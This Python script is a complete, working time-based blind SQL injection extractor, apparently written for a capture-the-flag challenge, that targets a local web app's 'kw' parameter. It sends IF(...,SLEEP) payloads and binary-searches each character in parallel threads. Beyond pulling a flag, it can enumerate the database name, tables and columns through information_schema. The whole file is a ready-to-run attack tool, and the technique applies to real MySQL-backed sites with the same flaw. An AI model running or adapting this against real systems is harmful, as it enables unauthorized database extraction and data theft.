#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Balanced time-based blind SQLi extractor for challenge 03.

This version keeps correctness checks but avoids voting every comparison:
- Uses a fresh false baseline near every tested condition.
- Uses one vote for normal binary-search comparisons by default.
- Re-checks every extracted character with an equality condition.
- Keeps concurrency moderate to avoid server-side queueing noise.
"""

import argparse
import os
import statistics
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

import requests

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:34601/")
PARAM = "kw"

DEFAULT_SLEEP = 2.0
DEFAULT_TIMEOUT = 3.5
DEFAULT_WORKERS = 6
DEFAULT_VOTES = 1
DEFAULT_VERIFY_VOTES = 3
MAX_RETRIES = 2

FLAG_EXPR = "SELECT flag FROM flag_table LIMIT 1"
FLAG_MAX_LEN = 90
KNOWN_FLAG_PREFIX = "TOGOGO-flag{"

PAYLOAD_SLEEP = "' AND IF(({cond}),SLEEP({sleep}),0)-- -"
PAYLOAD_FALSE = "' AND 1=2-- -"

_session_local = threading.local()
_print_lock = threading.Lock()


@dataclass(frozen=True)
class Config:
    url: str
    sleep: float
    timeout: float
    workers: int
    votes: int
    verify_votes: int
    delta: float
    ratio: float
    verbose: bool


def make_config(args: argparse.Namespace) -> Config:
    return Config(
        url=args.url.rstrip("/") + "/",
        sleep=args.sleep,
        timeout=args.timeout,
        workers=args.workers,
        votes=args.votes,
        verify_votes=args.verify_votes,
        delta=args.delta,
        ratio=args.ratio,
        verbose=args.verbose,
    )


def get_session() -> requests.Session:
    if not hasattr(_session_local, "session"):
        session = requests.Session()
        session.trust_env = False
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        _session_local.session = session
    return _session_local.session


def raw_get(cfg: Config, payload: str) -> tuple[float, int | str, int]:
    for attempt in range(MAX_RETRIES):
        start = time.perf_counter()
        try:
            resp = get_session().get(cfg.url, params={PARAM: payload}, timeout=cfg.timeout)
            return time.perf_counter() - start, resp.status_code, len(resp.text)
        except requests.exceptions.Timeout:
            return cfg.timeout, "timeout", 0
        except requests.RequestException as exc:
            if attempt == MAX_RETRIES - 1:
                with _print_lock:
                    print(f"\n[!] Request error: {exc}")
                return 0.0, "error", 0
            time.sleep(0.15)

    return 0.0, "error", 0


def timed_condition(cfg: Config, cond: str) -> float:
    payload = PAYLOAD_SLEEP.format(cond=cond, sleep=cfg.sleep)
    cost, _, _ = raw_get(cfg, payload)
    return cost


def baseline(cfg: Config) -> float:
    cost, _, _ = raw_get(cfg, PAYLOAD_FALSE)
    if cost <= 0:
        return 0.05
    return cost


def condition_once(cfg: Config, cond: str) -> tuple[bool, float, float, float]:
    base = baseline(cfg)
    cost = timed_condition(cfg, cond)
    diff = cost - base
    ratio = cost / max(base, 0.05)
    result = diff >= cfg.delta and ratio >= cfg.ratio
    return result, base, cost, ratio


def is_true(cfg: Config, cond: str, votes: int | None = None) -> bool:
    votes = cfg.votes if votes is None else votes
    checks: list[bool] = []
    details: list[tuple[float, float, float]] = []

    for _ in range(votes):
        result, base, cost, ratio = condition_once(cfg, cond)
        checks.append(result)
        details.append((base, cost, ratio))

    true_count = sum(checks)
    final = true_count > votes / 2

    if cfg.verbose:
        med_base = statistics.median(d[0] for d in details)
        med_cost = statistics.median(d[1] for d in details)
        med_ratio = statistics.median(d[2] for d in details)
        with _print_lock:
            print(
                f"    {cond[:90]} -> {true_count}/{votes} "
                f"base={med_base:.3f}s cost={med_cost:.3f}s ratio={med_ratio:.2f} => {final}"
            )

    return final


def health_check(cfg: Config) -> bool:
    try:
        resp = get_session().get(cfg.url, params={PARAM: "1"}, timeout=5)
        print(f"[*] Health check: status={resp.status_code}, len={len(resp.text)}")
        return resp.status_code < 500
    except requests.RequestException as exc:
        print(f"[-] Health check failed: {exc}")
        return False


def calibrate(cfg: Config) -> None:
    print("[*] Measuring baseline and sleep gap...")
    bases = [baseline(cfg) for _ in range(3)]
    false_costs = [timed_condition(cfg, "1=2") for _ in range(2)]
    true_costs = [timed_condition(cfg, "1=1") for _ in range(2)]

    print(f"[*] Baseline median: {statistics.median(bases):.3f}s")
    print(f"[*] False median: {statistics.median(false_costs):.3f}s")
    print(f"[*] True median: {statistics.median(true_costs):.3f}s")
    print(f"[*] Decision: cost-base >= {cfg.delta:.3f}s and cost/base >= {cfg.ratio:.2f}")


def test_sqli(cfg: Config) -> bool:
    print("[*] Testing time-based SQLi...")
    true_result = is_true(cfg, "1=1")
    false_result = is_true(cfg, "1=2")
    if true_result and not false_result:
        print("[+] SQLi confirmed.")
        return True
    print("[-] SQLi not confirmed. Try increasing --sleep or lowering --workers.")
    return False


def get_length(cfg: Config, expr: str, max_len: int) -> int:
    low, high = 0, max_len
    while low < high:
        mid = (low + high + 1) // 2
        if is_true(cfg, f"LENGTH(({expr}))>={mid}"):
            low = mid
        else:
            high = mid - 1
    return low


def sql_string(value: str) -> str:
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


def verify_char(cfg: Config, expr: str, pos: int, ch: str) -> bool:
    return is_true(
        cfg,
        f"SUBSTRING(({expr}),{pos},1)={sql_string(ch)}",
        votes=cfg.verify_votes,
    )


def get_char_binary(cfg: Config, expr: str, pos: int) -> str:
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if is_true(cfg, f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid

    ch = chr(low)
    if verify_char(cfg, expr, pos, ch):
        return ch

    # If a single noisy comparison poisoned the binary search, recover with a
    # small local scan around the guessed ASCII value before giving up.
    for code in range(max(32, low - 3), min(126, low + 3) + 1):
        candidate = chr(code)
        if verify_char(cfg, expr, pos, candidate):
            return candidate

    raise RuntimeError(f"Could not verify char at position {pos}; guessed {ch!r}")


def dump_expr(cfg: Config, expr: str, max_len: int) -> str:
    print(f"[*] Getting length of: {expr[:70]}")
    length = get_length(cfg, expr, max_len)
    print(f"[+] Length: {length}")

    if length == 0:
        return ""

    results: dict[int, str] = {}
    workers = min(cfg.workers, length)
    print(f"[*] Extracting {length} chars with {workers} workers...")

    def worker(pos: int) -> tuple[int, str]:
        ch = get_char_binary(cfg, expr, pos)
        with _print_lock:
            results[pos] = ch
            current = "".join(results.get(i, ".") for i in range(1, length + 1))
            print(f"\r[+] [{len(results):3d}/{length}] {current}", end="", flush=True)
        return pos, ch

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(worker, pos): pos for pos in range(1, length + 1)}
        for future in as_completed(futures):
            pos = futures[future]
            try:
                future.result()
            except Exception as exc:
                raise RuntimeError(f"Extraction failed at position {pos}: {exc}") from exc

    print()
    return "".join(results[i] for i in range(1, length + 1))


def verify_known_prefix(cfg: Config, expr: str, prefix: str, length: int) -> str:
    prefix = prefix[:length]
    if not prefix:
        return ""

    print(f"[*] Verifying known prefix: {prefix}")
    verified = ""
    for pos, ch in enumerate(prefix, start=1):
        if verify_char(cfg, expr, pos, ch):
            verified += ch
            continue
        print(f"[!] Prefix mismatch at pos {pos}; extracting from this point.")
        return verified

    return verified


def dump_flag(cfg: Config, expr: str, max_len: int, use_prefix: bool) -> str:
    print("[*] Getting flag length...")
    length = get_length(cfg, expr, max_len)
    print(f"[+] Flag length: {length}")

    if length == 0:
        return ""

    known = verify_known_prefix(cfg, expr, KNOWN_FLAG_PREFIX, length) if use_prefix else ""
    remaining_start = len(known) + 1

    if remaining_start > length:
        return known

    results: dict[int, str] = {pos: ch for pos, ch in enumerate(known, start=1)}
    positions = list(range(remaining_start, length + 1))
    workers = min(cfg.workers, len(positions))
    print(f"[*] Extracting {len(positions)} unknown chars with {workers} workers...")
    if known:
        current = "".join(results.get(i, ".") for i in range(1, length + 1))
        print(f"[+] Current: {current}")

    def worker(pos: int) -> tuple[int, str]:
        ch = get_char_binary(cfg, expr, pos)
        with _print_lock:
            results[pos] = ch
            current = "".join(results.get(i, ".") for i in range(1, length + 1))
            print(f"\r[+] [{len(results):3d}/{length}] {current}", end="", flush=True)
        return pos, ch

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(worker, pos): pos for pos in positions}
        for future in as_completed(futures):
            pos = futures[future]
            try:
                future.result()
            except Exception as exc:
                raise RuntimeError(f"Extraction failed at position {pos}: {exc}") from exc

    print()
    return "".join(results[i] for i in range(1, length + 1)).rstrip("\x00 ")


def full_dump(cfg: Config, max_len: int, use_prefix: bool) -> None:
    db = dump_expr(cfg, "DATABASE()", 80)
    print(f"[+] database(): {db}\n")

    tables = dump_expr(
        cfg,
        "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables "
        f"WHERE table_schema={sql_string(db)}",
        300,
    )
    print(f"[+] tables: {tables}\n")

    columns = dump_expr(
        cfg,
        "SELECT GROUP_CONCAT(column_name) FROM information_schema.columns "
        f"WHERE table_schema={sql_string(db)} AND table_name='flag_table'",
        300,
    )
    print(f"[+] flag_table columns: {columns}\n")

    flag = dump_flag(cfg, FLAG_EXPR, max_len, use_prefix)
    print(f"\n[+] FLAG: {flag}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Balanced time-based SQLi extractor")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target URL, default: {DEFAULT_URL}")
    parser.add_argument("--full", action="store_true", help="dump db/tables/columns before flag")
    parser.add_argument("--max-len", type=int, default=FLAG_MAX_LEN, help="max flag length")
    parser.add_argument("--no-prefix", action="store_true", help="do not assume TOGOGO-flag{ prefix")
    parser.add_argument("--sleep", type=float, default=DEFAULT_SLEEP, help="sleep seconds for true conditions")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="HTTP timeout in seconds")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help="concurrent character workers")
    parser.add_argument("--votes", type=int, default=DEFAULT_VOTES, help="vote count for normal comparisons")
    parser.add_argument(
        "--verify-votes",
        type=int,
        default=DEFAULT_VERIFY_VOTES,
        help="vote count for final character verification",
    )
    parser.add_argument("--delta", type=float, default=DEFAULT_SLEEP * 0.55, help="minimum cost-base gap")
    parser.add_argument("--ratio", type=float, default=1.8, help="minimum cost/base ratio")
    parser.add_argument("--verbose", action="store_true", help="print timing for each condition")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.votes < 1:
        print("[-] --votes must be >= 1")
        return 2
    if args.timeout <= args.sleep:
        print("[-] --timeout must be greater than --sleep")
        return 2
    if args.workers < 1:
        print("[-] --workers must be >= 1")
        return 2

    cfg = make_config(args)
    started = time.perf_counter()

    try:
        if not health_check(cfg):
            return 1
        calibrate(cfg)
        if not test_sqli(cfg):
            return 1

        if args.full:
            full_dump(cfg, args.max_len, not args.no_prefix)
        else:
            flag = dump_flag(cfg, FLAG_EXPR, args.max_len, not args.no_prefix)
            print(f"\n[+] FLAG: {flag}")
    except KeyboardInterrupt:
        print("\n[-] Interrupted")
        return 130
    except Exception as exc:
        print(f"\n[-] {exc}")
        return 1

    print(f"[*] Total time: {time.perf_counter() - started:.1f}s")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
